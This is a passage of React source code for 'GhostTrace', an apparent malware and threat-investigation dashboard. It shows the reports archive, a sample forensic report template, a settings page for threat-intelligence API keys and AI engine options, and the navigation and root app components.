    {ic:"📄",bg:"rgba(255,170,0,.1)",  name:"suspicious_update.js — Script Analysis",    meta:"HIGH · Obfuscated Code · 2024-11-30 11:30",          sz:"540 KB",level:"high"},
    {ic:"📄",bg:"rgba(0,255,136,.08)", name:"company_logo.png — File Verification",      meta:"CLEAN · No threats detected · 2024-11-30 12:44",    sz:"120 KB",level:"clean"},
    {ic:"📄",bg:"rgba(59,130,246,.1)", name:"Threat Intelligence Digest — Week 48",      meta:"WEEKLY · 12 threats tracked · 2024-11-30",           sz:"3.4 MB",level:"medium"},
  ];

  return (
    <div className="view">
      <div className="fjsb mb20">
        <div>
          <div style={{ fontSize:20, fontWeight:800, marginBottom:5 }}>📄 Investigation Reports</div>
          <div className="txt-sec txt-sm">Downloadable PDF forensic reports for all completed investigations</div>
        </div>
        <div className="fac gap8">
          <button className="btn btn-ghost btn-sm">⬇ Export All</button>
          <button className="btn btn-primary">+ New Scan</button>
        </div>
      </div>

      <div className="g3 mb16">
        <div className="stat c-green"><div className="stat-val" style={{color:"var(--green)"}}>62</div><div className="stat-lbl">Reports Generated</div></div>
        <div className="stat c-red"><div className="stat-val" style={{color:"var(--red)"}}>38</div><div className="stat-lbl">Threat Investigations</div></div>
        <div className="stat c-cyan"><div className="stat-val" style={{color:"var(--cyan)"}}>1,204</div><div className="stat-lbl">IOCs Documented</div></div>
      </div>

      <div className="card mb16">
        <div className="card-hd">
          <span className="card-title">📋 Report Archive</span>
          <div className="search-bar" style={{ width:220, height:32 }}>
            <span className="txt-muted" style={{fontSize:13}}>🔍</span>
            <input placeholder="Search reports…" />
          </div>
        </div>
        <div className="card-body">
          {(reportsData || reps).map((r, i) => (
            <div key={i} className="rep-card">
              <div className="rep-icon" style={{ background:r.bg }}>{r.ic}</div>
              <div className="f1" style={{ minWidth:0 }}>
                <div className="rep-name">{r.name}</div>
                <div className="rep-meta">{r.meta} · {r.sz}</div>
              </div>
              <Badge level={r.level} />
              <div className="fac gap6">
                <button className="btn btn-ghost btn-sm">View</button>
                <button className="btn btn-sec btn-sm">⬇ PDF</button>
              </div>
            </div>
          ))}
        </div>
      </div>

      <div className="card">
        <div className="card-hd"><span className="card-title">📑 PDF Report Template — Preview</span></div>
        <div className="card-body">
          <div className="code-block">
<span style={{color:"var(--cyan)"}}>══════════════════════════════════════════════════════════
</span><span style={{color:"var(--green)",fontWeight:700}}>  GhostTrace  ·  Forensic Investigation Report
</span><span style={{color:"var(--t3)"}}>  Generated: {new Date().toLocaleString()}  ·  CONFIDENTIAL
</span><span style={{color:"var(--cyan)"}}>══════════════════════════════════════════════════════════

</span><span style={{color:"var(--amber)",fontWeight:700}}>  [EXECUTIVE SUMMARY]
</span><span style={{color:"var(--t1)"}}>  High-confidence malware detected. Host isolation required.
</span><span style={{color:"var(--t2)"}}>  Emotet trojan dropper with C2 and process injection.

</span><span style={{color:"var(--amber)",fontWeight:700}}>  [RISK ASSESSMENT]
</span><span style={{color:"var(--red)"}}>  Score: 87/100  ·  CRITICAL  ·  Confidence: 94%

</span><span style={{color:"var(--amber)",fontWeight:700}}>  [IOC SUMMARY]
</span><span style={{color:"var(--t2)"}}>  IPs: 1  ·  Hashes: 2  ·  Reg Keys: 1  ·  Commands: 2  ·  URLs: 2

</span><span style={{color:"var(--amber)",fontWeight:700}}>  [YARA MATCHES]
</span><span style={{color:"var(--red)"}}>  Trojan.Win32.Emotet.ABCD  ·  Suspicious.PE.ProcessInjection

</span><span style={{color:"var(--amber)",fontWeight:700}}>  [RECOMMENDED ACTIONS]
</span><span style={{color:"var(--t2)"}}>  1. Quarantine affected host immediately
  2. Block 185.220.101.47 at perimeter firewall
  3. Forensic image before any remediation
  4. Scan lateral hosts for C2 beaconing activity
  5. Reset all credentials on affected host
</span><span style={{color:"var(--cyan)"}}>══════════════════════════════════════════════════════════</span></div>
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// PAGE: SETTINGS
// ═══════════════════════════════════════════════════════════════════════════════

function Settings({ backendStatus }) {
  const [t, setT] = useState({
    deep:true, yara:true, ai:true, ioc_export:false, pdf_auto:true,
    vt:true, phishtank:true, abuseipdb:true, urlscan:true, threatfox:false,
  });
  const [keys, setKeys] = useState({
    ghosttrace: "",
    virustotal: "",
    abuseipdb: "",
    openai: "",
    urlscan: "",
    phishtank: "",
  });
  const [serverMasked, setServerMasked] = useState({});
  const tog = k => setT(p => ({ ...p, [k]: !p[k] }));
  const setKey = (k, v) => setKeys((prev) => ({ ...prev, [k]: v }));

  useEffect(() => {
    try {
      const storedToggles = localStorage.getItem(SETTINGS_STORAGE_KEY);
      if (storedToggles) setT((prev) => ({ ...prev, ...JSON.parse(storedToggles) }));
      const storedKeys = localStorage.getItem(API_STORAGE_KEY);
      if (storedKeys) {
        const parsed = JSON.parse(storedKeys);
        setKeys((prev) => ({ ...prev, ...parsed }));
        if (parsed?.ghosttrace) setRuntimeApiKey(parsed.ghosttrace);
      }
    } catch (e) { reportClientError("Load local settings failed", e); }
  }, []);

  useEffect(() => {
    (async () => {
      try {
        const data = await apiJson("/api/settings/api-keys");
        setServerMasked(data?.masked || {});
      } catch (e) {
        reportClientError("Load API keys from backend failed", e);
      }
    })();
  }, []);

  useEffect(() => {
    try { localStorage.setItem(SETTINGS_STORAGE_KEY, JSON.stringify(t)); } catch (e) { reportClientError("Persist toggles failed", e); }
  }, [t]);

  const saveApiKeys = async () => {
    try { localStorage.setItem(API_STORAGE_KEY, JSON.stringify(keys)); } catch (e) { reportClientError("Persist API keys failed", e); }
    setRuntimeApiKey(keys.ghosttrace);
    try {
      await apiJson("/api/settings/api-keys", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ghosttrace_api_key: keys.ghosttrace || "",
          virustotal_api_key: keys.virustotal || "",
          abuseipdb_api_key: keys.abuseipdb || "",
          openai_api_key: keys.openai || "",
          urlscan_api_key: keys.urlscan || "",
          phishtank_api_key: keys.phishtank || "",
        }),
      });
    } catch (e) { reportClientError("Save API keys to backend failed", e); }
  };

  return (
    <div className="view">
      <div className="mb20">
        <div style={{ fontSize:20, fontWeight:800, marginBottom:5 }}>⚙ Settings & Configuration</div>
        <div className="txt-sec txt-sm">API keys · Scan engine options · AI model · Security & privacy</div>
      </div>

      <div className="g2">
        <div>
          <div className="card mb14">
            <div className="card-hd"><span className="card-title">🔑 API Keys</span><Badge level={backendStatus?.authState === "ok" ? "clean" : "amber"}>{backendStatus?.authState === "missing_api_key" ? "Missing API Key" : backendStatus?.authState === "invalid_api_key" ? "Invalid API Key" : backendStatus?.connected ? "Backend Connected" : "Backend Unreachable"}</Badge></div>
            <div className="card-body">
              {[["GhostTrace API Key","Required when backend enforces x-api-key","ghosttrace", "ghosttrace_api_key"],
                ["VirusTotal API Key","VT-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX","virustotal", "virustotal_api_key"],
                ["AbuseIPDB API Key","Your AbuseIPDB token here","abuseipdb", "abuseipdb_api_key"],
                ["OpenAI API Key","sk-proj-…","openai", "openai_api_key"],
                ["URLScan.io API Key","Your URLScan key","urlscan", "urlscan_api_key"],
                ["PhishTank App Key","Your PhishTank key","phishtank", "phishtank_api_key"],
              ].map(([lbl, ph, keyName, serverKey]) => (
                <div key={lbl} className="mb12">
                  <label className="inp-label">{lbl}</label>
                  <input className="inp" type="password" placeholder={keys[keyName] ? ph : (serverMasked[serverKey] || ph)} value={keys[keyName] || ""} onChange={e => setKey(keyName, e.target.value)} />
                </div>
              ))}
              <button className="btn btn-primary mt8" onClick={saveApiKeys}>💾 Save API Keys</button>
            </div>
          </div>

          <div className="card">
            <div className="card-hd"><span className="card-title">🤖 AI Engine</span></div>
            <div className="card-body">
              <label className="inp-label">Primary AI Model</label>
              <select className="inp sel mb12">
                <option>GPT-4o (Recommended — Best Analysis)</option>
                <option>GPT-4 Turbo</option>
                <option>GPT-3.5 Turbo (Faster / Cheaper)</option>
                <option>Local LLM via Ollama (Air-Gapped)</option>
              </select>
              <label className="inp-label">Local LLM Endpoint (Optional)</label>
              <input className="inp mb12" placeholder="http://localhost:11434 (Ollama default)" />
              <div className="info-box">Local LLM mode processes all data on-premise — recommended for sensitive investigations or air-gapped environments.</div>
            </div>
          </div>
        </div>

        <div>
          <div className="card mb14">
            <div className="card-hd"><span className="card-title">⚡ Scan Engine Options</span></div>
            <div className="card-body" style={{ padding:"10px 18px" }}>
              {[["deep",       "Deep Content Scan",       "Fetch and analyze full page HTML, scripts, and resources"],
                ["yara",       "YARA Signature Matching", "Enable local YARA engine with 10,204 curated rules"],
                ["ai",         "AI Threat Explanation",   "Generate explainable AI analysis for every finding"],
                ["ioc_export", "Auto-Export IOCs",        "Download IOC JSON automatically after each scan"],
                ["pdf_auto",   "Auto PDF Generation",     "Create downloadable forensic report after each scan"],
              ].map(([k, title, desc]) => (
                <div key={k} className="ck-row">
                  <div className="f1">
                    <div style={{ fontSize:12.5, fontWeight:600, color:"var(--t1)" }}>{title}</div>
                    <div className="mono txt-xs txt-muted">{desc}</div>
                  </div>
                  <Toggle on={t[k]} onChange={() => tog(k)} />
                </div>
              ))}
            </div>
          </div>

          <div className="card mb14">
            <div className="card-hd"><span className="card-title">📡 Threat Intelligence APIs</span></div>
            <div className="card-body" style={{ padding:"10px 18px" }}>
              {[["vt",        "VirusTotal",    "Hash + URL reputation (72 engines)"],
                ["phishtank", "PhishTank",     "Phishing URL real-time verification"],
                ["abuseipdb", "AbuseIPDB",     "IP abuse report lookups"],
                ["urlscan",   "URLScan.io",    "URL behavior + screenshot analysis"],
                ["threatfox", "ThreatFox",     "MalwareBazaar IOC feeds"],
              ].map(([k, name, desc]) => (
                <div key={k} className="ck-row">
                  <div className="f1">
                    <div style={{ fontSize:12.5, fontWeight:600, color:"var(--t1)" }}>{name}</div>
                    <div className="mono txt-xs txt-muted">{desc}</div>
                  </div>
                  <Toggle on={t[k]} onChange={() => tog(k)} />
                </div>
              ))}
            </div>
          </div>

          <div className="card">
            <div className="card-hd"><span className="card-title">📊 Platform Information</span></div>
            <div className="card-body" style={{ padding:"10px 18px" }}>
              {[["Version","GhostTrace v2.0.0"],["Build","2024-12 MVP+"],["Backend","FastAPI 0.104 + Python 3.11"],["Database","MongoDB 7.0"],["YARA Rules","10,204 loaded"],["AI Engine","GPT-4o + Ollama local option"],["Max Upload","50 MB per file"],["Scan Rate Limit","20 scans / hour"],["Data Retention","30 days (configurable)"]].map(([k, v]) => (
                <div key={k} className="ck-row">
                  <div className="ck-lbl">{k}</div>
                  <div className="ck-val txt-muted">{v}</div>
                </div>
              ))}
              <div className="ok-box mt12">✓ System status: {backendStatus?.statusText || (backendStatus?.connected ? "Connected" : "Backend down")}</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// SIDEBAR
// ═══════════════════════════════════════════════════════════════════════════════

const NAV = [
  { section:"Main", items:[
    { id:"dashboard", icon:"🏠", label:"Dashboard" },
    { id:"history",   icon:"📊", label:"Scan History" },
  ]},
  { section:"Analysis", items:[
    { id:"file-scan", icon:"🔍", label:"File Scanner" },
    { id:"url-scan",  icon:"🌐", label:"URL Scanner" },
    { id:"log-scan",  icon:"📋", label:"Log Analyzer" },
  ]},
  { section:"Investigation", items:[
    { id:"ioc",      icon:"🔗", label:"IOC Extractor" },
    { id:"timeline", icon:"🕵", label:"Attack Timeline" },
    { id:"intel",    icon:"🌍", label:"Threat Intel" },
  ]},
  { section:"Platform", items:[
    { id:"reports",  icon:"📄", label:"Reports", badge:"62" },
    { id:"settings", icon:"⚙",  label:"Settings" },
  ]},
];

function Sidebar({ view, setView, backendStatus }) {
  return (
    <div className="sb">
      <div className="sb-glow" />
      <div className="sb-logo">
        <div className="sb-logo-row">
          <svg viewBox="0 0 32 32" fill="none" style={{ width:28, height:28, flexShrink:0 }}>
            <polygon points="16,1 31,9 31,23 16,31 1,23 1,9" fill="none" stroke="#00ff88" strokeWidth="1.4" />
            <polygon points="16,6 26,12 26,20 16,26 6,20 6,12" fill="rgba(0,255,136,.06)" stroke="#00ff88" strokeWidth=".7" />
            <circle cx="16" cy="16" r="4.5" fill="none" stroke="#00d4ff" strokeWidth="1.1" />
            <circle cx="16" cy="16" r="1.8" fill="#00ff88" />
            <line x1="16" y1="6.5" x2="16" y2="11.5" stroke="#00ff88" strokeWidth=".9" />
            <line x1="16" y1="20.5" x2="16" y2="25.5" stroke="#00ff88" strokeWidth=".9" />
            <line x1="6" y1="12" x2="11.5" y2="15" stroke="#00ff88" strokeWidth=".9" />
            <line x1="20.5" y1="17" x2="26" y2="20" stroke="#00ff88" strokeWidth=".9" />
          </svg>
          <span className="sb-wordmark">GhostTrace</span>
        </div>
        <div className="sb-tagline">Threat Investigation Platform</div>
      </div>

      <div className="sb-nav">
        {NAV.map(s => (
          <div key={s.section} className="sb-sec">
            <span className="sb-sec-lbl">{s.section}</span>
            {s.items.map(item => (
              <div key={item.id} className={`sb-item ${view === item.id ? "active" : ""}`} onClick={() => setView(item.id)}>
                <span className="sb-ic">{item.icon}</span>
                <span>{item.label}</span>
                {item.badge && <span className="sb-badge">{item.badge}</span>}
              </div>
            ))}
          </div>
        ))}
      </div>

      <div className="sb-footer">
        <div className="sb-status-row"><div className="sb-dot" style={{ background: backendStatus?.authState === "ok" ? "var(--green)" : "var(--amber)", boxShadow: backendStatus?.authState === "ok" ? "0 0 7px var(--green)" : "0 0 7px var(--amber)" }} /><span>{backendStatus?.statusText || "Status unknown"}</span></div>
        <div className="sb-status-row" style={{ marginLeft:13 }}><span>VT {backendStatus?.providers?.virustotal ? "✓" : "•"}  IPDB {backendStatus?.providers?.abuseipdb ? "✓" : "•"}  PT {backendStatus?.providers?.phishtank ? "✓" : "•"}  YR {backendStatus?.yara ? "✓" : "•"}</span></div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// TOPBAR
// ═══════════════════════════════════════════════════════════════════════════════

const TITLES = {
  dashboard:"Dashboard",
  history:"Scan History",
  "file-scan":"File Scanner — Malware Analysis",
  "url-scan":"URL & Website Scanner",
  "log-scan":"Log Analyzer — Forensics",
  ioc:"IOC Extractor",
  timeline:"Attack Timeline & Reconstruction",
  intel:"Threat Intelligence",
  reports:"Investigation Reports",
  settings:"Settings & Configuration",
};

function Topbar({ view, backendStatus }) {
  const [time, setTime] = useState(new Date().toLocaleTimeString());
  useEffect(() => {
    const id = setInterval(() => setTime(new Date().toLocaleTimeString()), 1000);
    return () => clearInterval(id);
  }, []);
  return (
    <div className="topbar">
      <div style={{ fontSize:13.5, fontWeight:700, flex:1 }}>📡 {TITLES[view] || "GhostTrace"}</div>
      <div className="topbar-chips">
        <div className="t-chip"><span className="live-dot" style={{ background: backendStatus?.connected ? "var(--green)" : "var(--amber)" }} />{backendStatus?.connected ? "Live" : (backendStatus?.authState === "missing_api_key" ? "Auth Required" : backendStatus?.authState === "invalid_api_key" ? "Auth Invalid" : "Offline")}</div>
        <div className="t-chip">🕐 {time}</div>
        <div className="t-chip">⬡ v2.0</div>
        <div className="t-chip">🛡 {backendStatus?.yara ? "YARA Active" : "YARA Unknown"}</div>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// ROOT APP
// ═══════════════════════════════════════════════════════════════════════════════

export default function GhostTrace() {
  const [view, setView] = useState("dashboard");
  const [historyItems, setHistoryItems] = useState(HISTORY);
  const [reportsData, setReportsData] = useState(null);
  const [backendStatus, setBackendStatus] = useState({
    connected: false,
    yara: false,
    authState: "unknown",
    statusText: "Initializing backend status",
    providers: { virustotal: false, abuseipdb: false, phishtank: false },
  });

  useEffect(() => {
    let mounted = true;
    (async () => {
      try {
        const [files, urls, logs, reports] = await Promise.all([
          apiJson("/api/history/files?limit=200"),
          apiJson("/api/history/urls?limit=200"),
          apiJson("/api/history/logs?limit=200"),
          apiJson("/api/reports?limit=200"),
        ]);
        if (!mounted) return;
        const fileItems = (files?.items || []).map((d) => mapHistoryItem(d, "file"));
        const urlItems = (urls?.items || []).map((d) => mapHistoryItem(d, "url"));
        const logItems = (logs?.items || []).map((d) => mapHistoryItem(d, "log"));
        const merged = [...fileItems, ...urlItems, ...logItems].sort((a, b) => b.ts - a.ts);
        if (merged.length) setHistoryItems(merged);
        const reportCards = (reports?.items || []).map((r, i) => {
          const sev = normalizeLevel(r?.severity || r?.risk_level);
          const created = r?.created_at ? new Date(r.created_at).toLocaleString() : "-";
          const target = r?.target || r?.filename || r?.url || `Report ${i + 1}`;
          return {
            ic: "📄",
            bg: sev === "critical" ? "rgba(255,45,85,.1)" : sev === "high" ? "rgba(255,170,0,.1)" : sev === "clean" ? "rgba(0,255,136,.08)" : "rgba(59,130,246,.1)",
            name: `${target} — Investigation Report`,
            meta: `${sev.toUpperCase()} · ${created}`,
            sz: r?.size || "PDF",
            level: sev,
          };
        });
        if (reportCards.length) setReportsData(reportCards);
      } catch (e) { reportClientError("Load history/reports failed", e); }
    })();
    return () => { mounted = false; };
  }, []);

  useEffect(() => {
    let active = true;
    const loadStatus = async () => {
      try {
        const parseStatus = (res) => (res?.status === "rejected" ? Number(res.reason?.status || 0) : 0);
        const [healthRes, libsRes, monitorRes] = await Promise.allSettled([
          apiJson("/health"),
          apiJson("/api/security-libs-status"),
          apiJson("/api/monitor/status"),
        ]);
        const health = healthRes.status === "fulfilled" ? healthRes.value : null;
        const libs = libsRes.status === "fulfilled" ? libsRes.value : null;
        const monitor = monitorRes.status === "fulfilled" ? monitorRes.value : null;
        const localKeys = (() => {
          try { return JSON.parse(localStorage.getItem(API_STORAGE_KEY) || "{}"); } catch { return {}; }
        })();
        if (!active) return;
        const libsCode = parseStatus(libsRes);
        const monitorCode = parseStatus(monitorRes);
        const healthCode = parseStatus(healthRes);
        const authState = libsCode === 401 || monitorCode === 401
          ? "missing_api_key"
          : libsCode === 403 || monitorCode === 403
            ? "invalid_api_key"
            : libsCode === 500 || monitorCode === 500
              ? "server_misconfigured"
              : "ok";
        setBackendStatus({
          connected: Boolean(health?.status === "ok"),
          yara: Boolean(libs?.yara?.available),
          authState,
          statusText: !health
            ? (healthCode === 500 ? "Backend misconfigured" : "Backend down")
            : authState === "missing_api_key"
              ? "Missing API key"
              : authState === "invalid_api_key"
                ? "Invalid API key"
                : authState === "server_misconfigured"
                  ? "Backend misconfigured"
                : "Connected",
          providers: {
            virustotal: Boolean(libs?.provider_status?.virustotal || localKeys?.virustotal),
            abuseipdb: Boolean(libs?.provider_status?.abuseipdb || localKeys?.abuseipdb),
            phishtank: Boolean(libs?.provider_status?.phishtank || localKeys?.phishtank),
          },
          watchlistCount: Array.isArray(monitor?.watchlist) ? monitor.watchlist.length : 0,
        });
      } catch (e) {
        reportClientError("Load backend status failed", e);
        if (!active) return;
        setBackendStatus((prev) => ({ ...prev, connected: false, authState: "backend_down", statusText: "Backend down" }));
      }
    };
    loadStatus();
    const id = setInterval(loadStatus, 30000);
    return () => { active = false; clearInterval(id); };
  }, []);

  return (
    <div className="gt">
      <style dangerouslySetInnerHTML={{ __html: CSS }} />
      <Sidebar view={view} setView={setView} backendStatus={backendStatus} />
      <div className="gt-main">
        <Topbar view={view} backendStatus={backendStatus} />
        <div className="gt-scroll">
          {view === "dashboard" && <Dashboard setView={setView} />}
          {view === "history"   && <ScanHistory setView={setView} historyItems={historyItems} />}
          {view === "file-scan" && <FileScanner />}
          {view === "url-scan"  && <URLScanner />}
          {view === "log-scan"  && <LogAnalyzer />}
          {view === "ioc"       && <IOCExtractor />}
          {view === "timeline"  && <AttackTimeline />}
          {view === "intel"     && <ThreatIntel />}
          {view === "reports"   && <Reports reportsData={reportsData} />}
          {view === "settings"  && <Settings backendStatus={backendStatus} />}
        </div>
      </div>
    </div>
  );
}







